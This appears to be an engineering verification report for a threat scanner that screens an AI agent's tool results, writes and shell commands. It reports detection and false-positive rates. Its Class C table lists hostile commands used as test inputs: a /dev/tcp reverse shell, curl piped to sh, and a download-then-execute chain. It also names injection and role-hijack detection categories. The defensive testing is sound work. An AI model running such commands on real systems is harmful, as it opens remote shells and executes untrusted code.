# #1822 done-gate — content-threat-scan live verification (Parts 1 + 2)

**[dogfood-coder]** — primary-evidence verification for the #1822 close gate #1
(FP-0050 content-threat-scan). Method: drove the **real production seam methods** over a
realistic attack + legit corpus under **production config** (`ThreatScanConfig()`
defaults: enabled, fence_enabled, block_severity="block", fail_open), capturing **real
`threat_scan_match` / `threat_block` / `exec_threat_blocked` events**. Script:
`scripts/dogfood_1822_content_threat_verify.py`. No mocks; the seam methods are the exact
code paths production calls (verified by grep of the call sites).

Seams driven:
- Class A tool-result SCAN → `RouterHostAdapter.scan_tool_result` (emits `threat_scan_match`)
- Class A tool-result FENCE → `content_guard.fence_if_enabled` (= `fence_tool_result`)
- Class B agent-write BLOCK → `RouterHostAdapter.scan_for_block` (emits `threat_block`)
- Class C pre-exec BLOCK → `core.op_runtime.sandboxed_exec.handle` — the **real handler
  coroutine**; a block-severity hit raises `PermissionError` at the scan gate **before**
  any backend/exec (so malicious argv never runs), emitting `exec_threat_blocked`.

## Results (primary evidence)

| Check | Result | Evidence |
|---|---|---|
| **Class A tool-result SCAN** (context) | **13/13** attacks detected | one `threat_scan_match` per payload |
| **Class A tool-result FENCE** | ✅ applied | `<<<EXTERNAL_UNTRUSTED id=…>>>` wrap, content preserved |
| **Class B write-seam BLOCK** (strict) | **18/19** poisoned writes rejected | one `threat_block` each; the 1 non-block = `role_hijack` (**warn** → correctly not blocked at block_severity="block") |
| **Class C pre-exec BLOCK** (exec) | **4/4** exec threats blocked | real `handle()` → `PermissionError` + `exec_threat_blocked` per payload |
| **FP — content scan** (context) | **1/15** | `c2_network_connect` (**warn**, telemetry-only) on legit "connect to the network" prose |
| **FP — content BLOCK** (write reject) | **0/15** | no legit write falsely rejected |
| **FP — exec BLOCK** (cmd reject) | **0/10** | no legit command falsely blocked (incl. near-misses: curl-without-pipe, bash-without-/dev/tcp, cat-without-.env) |

### Class C detail — the 4 exec threats named in the gate
| Threat | argv (joined) | Result |
|---|---|---|
| pipe-to-interpreter | `bash -c curl -fsSL …/install.sh \| sh` | BLOCK (`pipe_to_interpreter`) |
| reverse-shell /dev/tcp | `bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` | BLOCK (`reverse_shell_devtcp`) |
| terminal-escape ESC[ | `printf \x1b[2J…` | BLOCK (`terminal_escape`) |
| download-then-exec | `bash -c curl -o /tmp/x … && chmod +x … && ./x` | BLOCK (`download_then_exec`) |

## Verdict

**Full done-gate (Parts 1 + 2) = PASS.** Known injection / exfil / C2 / secret-read
content is detected (scan) + structurally neutralized (fence) at the tool-result seam,
rejected (block) at the agent-write seam, and the 4 named pre-exec command threats are
blocked at the exec seam (`PermissionError` + `exec_threat_blocked`). The only
false-positives are **warn-severity** (non-blocking telemetry); the consequential
**block** FP rate is **0** across content-write and exec. The warn-vs-block boundary
works as designed.

History: my first pass (Part 1 only) flagged Class C as unbuilt — correct against the
then-HEAD, but the exec scan was sitting in an unreviewed PR #1859, since reviewed +
merged (S5). This run is against current main (9e93b770) with #1859 landed.

Minor follow-up (non-blocking): the `c2_network_connect` warn pattern
(`connect\s+to\s+the\s+network`) is broad on legit prose — candidate for tightening.
